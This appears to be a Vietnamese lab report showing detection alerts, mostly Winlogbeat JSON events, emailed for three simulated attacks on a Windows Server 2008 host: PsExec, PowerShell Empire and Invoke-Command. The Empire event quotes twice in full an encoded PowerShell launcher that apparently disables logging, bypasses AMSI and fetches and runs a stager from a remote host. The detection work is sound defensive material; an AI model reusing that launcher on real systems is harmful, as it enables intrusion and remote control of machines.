# Kết quả gửi về mail:

## Test case 1: PsExec:
![Test case 1: PsExec](/Images/testcase1_psexec.png)
```
Phat hien su tan cong cua Test case 1 PsExec
        Tong event: 1

-----------------------------------------------------------------------------------
Test case 1 PsExec
-----------------------------------------------------------------------------------
{
    "_id": "Eq7tXXMBqCgffGtQA56k",
    "_index": "winlogbeat-7.7.0-2020.07.17",
    "_score": null,
    "_source": {
        "@timestamp": "2020-07-17T17:57:58.257Z",
        "@version": "1",
        "agent": {
            "ephemeral_id": "bd555251-2073-432b-8e4f-cfb74a040746",
            "hostname": "WINSRV",
            "id": "b002425b-af48-4008-8d0a-9e3014604a59",
            "type": "winlogbeat",
            "version": "7.7.0"
        },
        "ecs": {
            "version": "1.5.0"
        },
        "event": {
            "code": 7045,
            "created": "2020-07-17T17:58:00.451Z",
            "kind": "event",
            "provider": "Service Control Manager"
        },
        "host": {
            "architecture": "x86_64",
            "hostname": "WINSRV",
            "id": "f4be2742-f414-4caa-bb87-f4003a376c01",
            "ip": [
                "fe80::f072:ce34:86ef:7229",
                "192.168.255.100",
                "fe80::5efe:c0a8:ff64",
                "fe80::100:7f:fffe"
            ],
            "mac": [
                "00:0c:29:fc:f0:a9",
                "00:00:00:00:00:00:00:e0",
                "00:00:00:00:00:00:00:e0"
            ],
            "name": "WINSRV.winsrv2008.local",
            "os": {
                "build": "7601.24546",
                "family": "windows",
                "kernel": "6.1.7601.24545 (win7sp1_ldr_escrow.200102-1707)",
                "name": "Windows Server 2008 R2 Datacenter",
                "platform": "windows",
                "version": "6.1"
            }
        },
        "log": {
            "level": "information"
        },
        "message": "A service was installed in the system.\n\nService Name:  PSEXESVC\nService File Name:  %SystemRoot%\\PSEXESVC.exe\nService Type:  user mode service\nService Start Type:  demand start\nService Account:  LocalSystem",
        "tags": [
            "beats_input_codec_plain_applied"
        ],
        "winlog": {
            "api": "wineventlog",
            "channel": "System",
            "computer_name": "WINSRV.winsrv2008.local",
            "event_data": {
                "AccountName": "LocalSystem",
                "ImagePath": "%SystemRoot%\\PSEXESVC.exe",
                "ServiceName": "PSEXESVC",
                "ServiceType": "user mode service",
                "StartType": "demand start"
            },
            "event_id": 7045,
            "keywords": [
                "Classic"
            ],
            "process": {
                "pid": 512,
                "thread": {
                    "id": 1060
                }
            },
            "provider_guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
            "provider_name": "Service Control Manager",
            "record_id": 12841,
            "task": "",
            "user": {
                "domain": "WINSRV2008",
                "identifier": "S-1-5-21-4220747943-3152432350-320651364-1000",
                "name": "sv",
                "type": "User"
            }
        }
    },
    "_type": "_doc",
    "sort": [
        1595008678257
    ]
}
```
## Test case 2: Powershell Empire
* Phần log được ghi lại ở maillog của máy monitor: Nội dung log này bị chặn bởi google
```
Something went wrong... (552, '5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. v3sm20015788pfb.207 - gsmtp')
Phat hien su tan cong cua Test case 2 Powershell
	Tong event: 1


-----------------------------------------------------------------------------------
Test case 2 Powershell
-----------------------------------------------------------------------------------
{
    "_id": "A4YqlnMB9w7dbfuYrmlt", 
    "_index": "winlogbeat-7.7.0-2020.07.28", 
    "_score": null, 
    "_source": {
        "@timestamp": "2020-07-28T16:04:05.000Z", 
        "@version": "1", 
        "agent": {
            "ephemeral_id": "f088444c-d823-497c-9ac9-1df8cd9bbafb", 
            "hostname": "WINSRV", 
            "id": "b002425b-af48-4008-8d0a-9e3014604a59", 
            "type": "winlogbeat", 
            "version": "7.7.0"
        }, 
        "ecs": {
            "version": "1.5.0"
        }, 
        "event": {
            "action": "Engine Lifecycle", 
            "code": 400, 
            "created": "2020-07-28T16:04:05.466Z", 
            "kind": "event", 
            "provider": "PowerShell"
        }, 
        "host": {
            "architecture": "x86_64", 
            "hostname": "WINSRV", 
            "id": "f4be2742-f414-4caa-bb87-f4003a376c01", 
            "ip": [
                "fe80::f072:ce34:86ef:7229", 
                "192.168.255.100", 
                "fe80::5efe:c0a8:ff64", 
                "fe80::100:7f:fffe"
            ], 
            "mac": [
                "00:0c:29:fc:f0:a9", 
                "00:00:00:00:00:00:00:e0", 
                "00:00:00:00:00:00:00:e0"
            ], 
            "name": "WINSRV.winsrv2008.local", 
            "os": {
                "build": "7601.24546", 
                "family": "windows", 
                "kernel": "6.1.7601.24545 (win7sp1_ldr_escrow.200102-1707)", 
                "name": "Windows Server 2008 R2 Datacenter", 
                "platform": "windows", 
                "version": "6.1"
            }
        }, 
        "log": {
            "level": "information"
        }, 
        "message": "Engine state is changed from None to Available. \n\nDetails: \n\tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.14409.1018\n\tHostId=c7d6c52b-6b19-4e14-8bce-1d0ca0e8848a\n\tHostApplication=powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8ATgBUAEEAYgBMAEUALgBQAFMAVgBFAFIAUwBpAG8ATgAuAE0AQQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBlAEYAXQAuAEEAUwBzAGUAbQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAGkAZQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEATABVAGUAKAAkAG4AdQBsAEwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAQQBMAD0AWwBDAE8ATABsAGUAQwBUAGkAbwBOAFMALgBHAGUAbgBFAFIASQBDAC4ARABJAEMAVABJAE8AbgBhAHIAWQBbAHMAdABSAGkATgBHACwAUwB5AHMAVABFAE0ALgBPAGIAagBlAEMAVABdAF0AOgA6AE4AZQBXACgAKQA7ACQAdgBhAEwALgBBAEQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJAB2AGEAbAB9AEUAbABzAEUAewBbAFMAYwBSAGkAUABUAEIATABPAGMASwBdAC4AIgBHAEUAdABGAGkARQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAdQBlACgAJABOAHUAbABMACwAKABOAGUAVwAtAE8AQgBqAEUAQwBUACAAQwBvAEwATABFAGMAdABJAE8ATgBzAC4ARwBlAE4AZQBSAEkAQwAuAEgAYQBzAEgAUwBFAHQAWwBTAHQAUgBJAG4ARwBdACkAKQB9AFsAUgBFAEYAXQAuAEEAUwBTAEUAbQBiAGwAWQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBpAGUATABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAGEAbAB1AEUAKAAkAE4AVQBsAGwALAAkAHQAcgB1AGUAKQB9ADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAVAAuAFMARQBSAFYAaQBjAGUAUABPAEkATgBUAE0AQQBOAGEARwBlAHIAXQA6ADoARQBYAHAAZQBjAHQAMQAwADAAQwBPAE4AdABpAG4AdQBlAD0AMAA7ACQAdwBDAD0ATgBFAFcALQBPAEIAagBFAGMAVAAgAFMAWQBzAFQARQBNAC4ATgBFAFQALgBXAGUAYgBDAGwAaQBlAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAQwAuAEgARQBBAGQAZQByAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAUgBvAHgAeQA9AFsAUwBZAHMAdABlAE0ALgBOAEUAVAAuAFcARQBCAFIAZQBRAFUAZQBzAHQAXQA6ADoARABFAGYAYQB1AGwAdABXAEUAYgBQAFIATwB4AFkAOwAkAFcAYwAuAFAAcgBvAHgAWQAuAEMAcgBFAGQARQBuAHQASQBhAEwAcwAgAD0AIABbAFMAeQBTAFQAZQBtAC4ATgBFAFQALgBDAHIAZQBEAGUAbgB0AGkAQQBMAEMAYQBDAEgAZQBdADoAOgBEAGUARgBBAHUAbABUAE4ARQB0AHcAbwBSAEsAQwBSAGUAZABFAE4AVABpAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AHMAVABFAE0ALgBUAGUAWAB0AC4ARQBuAEMAbwBEAGkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQBUAEUAUwAoACcATABsAG4ARgBmACsAQwAqAD4AbwAuAG0ANQBUADsASwBxAEUAVgBJAHAAWwBeAF8AdABjAC8ATgBQACgASAB9ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADEAOgA4ADAAOAAwACcAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAFcAQwAuAEgAZQBBAEQARQByAHMALgBBAGQARAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AEwAWQBTAEsAdwBBAG4AMABLAEkARQB4AEoAMwByAGsAawBIAEQAWABRAG8AQwBLAEoAOQB3AD0AIgApADsAJABEAEEAdABBAD0AJABXAEMALgBEAG8AdwBuAGwATwBhAEQARABBAHQAYQAoACQAUwBFAHIAKwAkAHQAKQA7ACQASQB2AD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABkAGEAdABhAD0AJABEAGEAdABhAFsANAAuAC4AJABkAEEAdABhAC4AbABFAG4ARwB0AEgAXQA7AC0AagBPAGkAbgBbAEMASABBAFIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\n\tEngineVersion=5.1.14409.1018\n\tRunspaceId=cb821a74-cd29-4b8e-aa5c-f26712252ded\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=", 
        "tags": [
            "beats_input_codec_plain_applied"
        ], 
        "winlog": {
            "api": "wineventlog", 
            "channel": "Windows PowerShell", 
            "computer_name": "WINSRV.winsrv2008.local", 
            "event_data": {
                "param1": "Available", 
                "param2": "None", 
                "param3": "\tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.14409.1018\n\tHostId=c7d6c52b-6b19-4e14-8bce-1d0ca0e8848a\n\tHostApplication=powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8ATgBUAEEAYgBMAEUALgBQAFMAVgBFAFIAUwBpAG8ATgAuAE0AQQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBlAEYAXQAuAEEAUwBzAGUAbQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAGkAZQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEATABVAGUAKAAkAG4AdQBsAEwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAQQBMAD0AWwBDAE8ATABsAGUAQwBUAGkAbwBOAFMALgBHAGUAbgBFAFIASQBDAC4ARABJAEMAVABJAE8AbgBhAHIAWQBbAHMAdABSAGkATgBHACwAUwB5AHMAVABFAE0ALgBPAGIAagBlAEMAVABdAF0AOgA6AE4AZQBXACgAKQA7ACQAdgBhAEwALgBBAEQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJAB2AGEAbAB9AEUAbABzAEUAewBbAFMAYwBSAGkAUABUAEIATABPAGMASwBdAC4AIgBHAEUAdABGAGkARQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAdQBlACgAJABOAHUAbABMACwAKABOAGUAVwAtAE8AQgBqAEUAQwBUACAAQwBvAEwATABFAGMAdABJAE8ATgBzAC4ARwBlAE4AZQBSAEkAQwAuAEgAYQBzAEgAUwBFAHQAWwBTAHQAUgBJAG4ARwBdACkAKQB9AFsAUgBFAEYAXQAuAEEAUwBTAEUAbQBiAGwAWQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBpAGUATABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAGEAbAB1AEUAKAAkAE4AVQBsAGwALAAkAHQAcgB1AGUAKQB9ADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAVAAuAFMARQBSAFYAaQBjAGUAUABPAEkATgBUAE0AQQBOAGEARwBlAHIAXQA6ADoARQBYAHAAZQBjAHQAMQAwADAAQwBPAE4AdABpAG4AdQBlAD0AMAA7ACQAdwBDAD0ATgBFAFcALQBPAEIAagBFAGMAVAAgAFMAWQBzAFQARQBNAC4ATgBFAFQALgBXAGUAYgBDAGwAaQBlAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAQwAuAEgARQBBAGQAZQByAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAUgBvAHgAeQA9AFsAUwBZAHMAdABlAE0ALgBOAEUAVAAuAFcARQBCAFIAZQBRAFUAZQBzAHQAXQA6ADoARABFAGYAYQB1AGwAdABXAEUAYgBQAFIATwB4AFkAOwAkAFcAYwAuAFAAcgBvAHgAWQAuAEMAcgBFAGQARQBuAHQASQBhAEwAcwAgAD0AIABbAFMAeQBTAFQAZQBtAC4ATgBFAFQALgBDAHIAZQBEAGUAbgB0AGkAQQBMAEMAYQBDAEgAZQBdADoAOgBEAGUARgBBAHUAbABUAE4ARQB0AHcAbwBSAEsAQwBSAGUAZABFAE4AVABpAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AHMAVABFAE0ALgBUAGUAWAB0AC4ARQBuAEMAbwBEAGkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQBUAEUAUwAoACcATABsAG4ARgBmACsAQwAqAD4AbwAuAG0ANQBUADsASwBxAEUAVgBJAHAAWwBeAF8AdABjAC8ATgBQACgASAB9ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADEAOgA4ADAAOAAwACcAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAFcAQwAuAEgAZQBBAEQARQByAHMALgBBAGQARAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AEwAWQBTAEsAdwBBAG4AMABLAEkARQB4AEoAMwByAGsAawBIAEQAWABRAG8AQwBLAEoAOQB3AD0AIgApADsAJABEAEEAdABBAD0AJABXAEMALgBEAG8AdwBuAGwATwBhAEQARABBAHQAYQAoACQAUwBFAHIAKwAkAHQAKQA7ACQASQB2AD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABkAGEAdABhAD0AJABEAGEAdABhAFsANAAuAC4AJABkAEEAdABhAC4AbABFAG4ARwB0AEgAXQA7AC0AagBPAGkAbgBbAEMASABBAFIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\n\tEngineVersion=5.1.14409.1018\n\tRunspaceId=cb821a74-cd29-4b8e-aa5c-f26712252ded\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="
            }, 
            "event_id": 400, 
            "keywords": [
                "Classic"
            ], 
            "opcode": "Info", 
            "provider_name": "PowerShell", 
            "record_id": 833, 
            "task": "Engine Lifecycle"
        }
    }, 
    "_type": "_doc", 
    "sort": [
        1595952245000
    ]
}

```
* Do đó phần log của tấn công này sẽ không gửi kèm cho quản trị viên.
![Test case 2: Powershell Empire](/Images/testcase2_empire.png)
```
Phat hien su tan cong cua Test case 2 Powershell
        Tong event: 1

-----------------------------------------------------------------------------------
Test case 2 Powershell
-----------------------------------------------------------------------------------
```

## Test case 3: Invoke-Command cmdlet
![Test case 3: Invoke Command Cmdlet](testcase3_invoke_command_cmdlet.png)
```
Phat hien su tan cong cua Test case 3 Invoke-Command cmdlet
        Tong event: 1

-----------------------------------------------------------------------------------
Test case 3 Invoke-Command cmdlet
-----------------------------------------------------------------------------------
{
    "_id": "rHdDknMBQGGqkhfefMoO",
    "_index": "winlogbeat-7.7.0-2020.07.28",
    "_score": null,
    "_source": {
        "@timestamp": "2020-07-28T06:20:51.698Z",
        "@version": "1",
        "agent": {
            "ephemeral_id": "d4fb884b-fb62-4938-9918-463239b8cc5d",
            "hostname": "WINSRV",
            "id": "b002425b-af48-4008-8d0a-9e3014604a59",
            "type": "winlogbeat",
            "version": "7.7.0"
        },
        "ecs": {
            "version": "1.5.0"
        },
        "event": {
            "action": "Registry",
            "code": 4656,
            "created": "2020-07-28T06:20:53.465Z",
            "kind": "event",
            "provider": "Microsoft-Windows-Security-Auditing"
        },
        "host": {
            "architecture": "x86_64",
            "hostname": "WINSRV",
            "id": "f4be2742-f414-4caa-bb87-f4003a376c01",
            "ip": [
                "fe80::f072:ce34:86ef:7229",
                "192.168.255.100",
                "fe80::5efe:c0a8:ff64",
                "fe80::100:7f:fffe"
            ],
            "mac": [
                "00:0c:29:fc:f0:a9",
                "00:00:00:00:00:00:00:e0",
                "00:00:00:00:00:00:00:e0"
            ],
            "name": "WINSRV.winsrv2008.local",
            "os": {
                "build": "7601.24546",
                "family": "windows",
                "kernel": "6.1.7601.24545 (win7sp1_ldr_escrow.200102-1707)",
                "name": "Windows Server 2008 R2 Datacenter",
                "platform": "windows",
                "version": "6.1"
            }
        },
        "log": {
            "level": "information"
        },
        "message": "A handle to an object was requested.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-4220747943-3152432350-320651364-1000\n\tAccount Name:\t\tsv\n\tAccount Domain:\t\tWINSRV2008\n\tLogon ID:\t\t0x23ecca\n\nObject:\n\tObject Server:\t\tSecurity\n\tObject Type:\t\tKey\n\tObject Name:\t\t\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\n\tHandle ID:\t\t0x294\n\nProcess Information:\n\tProcess ID:\t\t0x1278\n\tProcess Name:\t\tC:\\Windows\\System32\\wsmprovhost.exe\n\nAccess Request Information:\n\tTransaction ID:\t\t{00000000-0000-0000-0000-000000000000}\n\tAccesses:\t\tREAD_CONTROL\n\t\t\t\tQuery key value\n\t\t\t\tEnumerate sub-keys\n\t\t\t\tNotify about changes to keys\n\t\t\t\t\n\tAccess Reasons:\t\t-\n\tAccess Mask:\t\t0x20019\n\tPrivileges Used for Access Check:\t-\n\tRestricted SID Count:\t0",
        "tags": [
            "beats_input_codec_plain_applied"
        ],
        "winlog": {
            "api": "wineventlog",
            "channel": "Security",
            "computer_name": "WINSRV.winsrv2008.local",
            "event_data": {
                "AccessList": "%%1538\n\t\t\t\t%%4432\n\t\t\t\t%%4435\n\t\t\t\t%%4436\n\t\t\t\t",
                "AccessMask": "0x20019",
                "AccessReason": "-",
                "HandleId": "0x294",
                "ObjectName": "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN",
                "ObjectServer": "Security",
                "ObjectType": "Key",
                "PrivilegeList": "-",
                "ProcessId": "0x1278",
                "ProcessName": "C:\\Windows\\System32\\wsmprovhost.exe",
                "RestrictedSidCount": "0",
                "SubjectDomainName": "WINSRV2008",
                "SubjectLogonId": "0x23ecca",
                "SubjectUserName": "sv",
                "SubjectUserSid": "S-1-5-21-4220747943-3152432350-320651364-1000",
                "TransactionId": "{00000000-0000-0000-0000-000000000000}"
            },
            "event_id": 4656,
            "keywords": [
                "Audit Success"
            ],
            "opcode": "Info",
            "process": {
                "pid": 552,
                "thread": {
                    "id": 568
                }
            },
            "provider_guid": "{54849625-5478-4994-A5BA-3E3B0328C30D}",
            "provider_name": "Microsoft-Windows-Security-Auditing",
            "record_id": 1985985,
            "task": "Registry",
            "version": 1
        }
    },
    "_type": "_doc",
    "sort": [
        1595917251698
    ]
}
```
